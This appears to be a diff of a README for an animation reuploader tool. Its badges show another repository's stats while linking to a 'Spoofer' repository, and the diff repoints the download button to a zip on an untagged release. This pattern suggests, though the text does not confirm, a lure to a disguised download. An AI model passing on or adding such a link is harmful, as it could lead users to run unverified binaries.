@@ -2,7 +2,7 @@
 [![Downloads](https://img.shields.io/github/downloads/kartfr/Auto-Animation-Reuploader/total?color=green)](https://github.com/Betaliza/Spoofer/releases)
 [![Lastest](https://img.shields.io/github/v/release/kartfr/Auto-Animation-Reuploader?color=green)](https://github.com/Betaliza/Spoofer/releases/latest)
 [![License](https://img.shields.io/github/license/kartFr/Auto-Animation-Reuploader?color=green)](https://github.com/Betaliza/Spoofer)
-[![Download](https://img.shields.io/badge/download-blue)](https://github.com/Betaliza/Spoofer/releases/latest/download/AnimationReuploader.zip)
+[![Download](https://img.shields.io/badge/download-blue)](https://github.com/Betaliza/Spoofer/releases/download/untagged-90b6c413578493218c5a/AnimationReuploader.zip)
 
 
 ## info
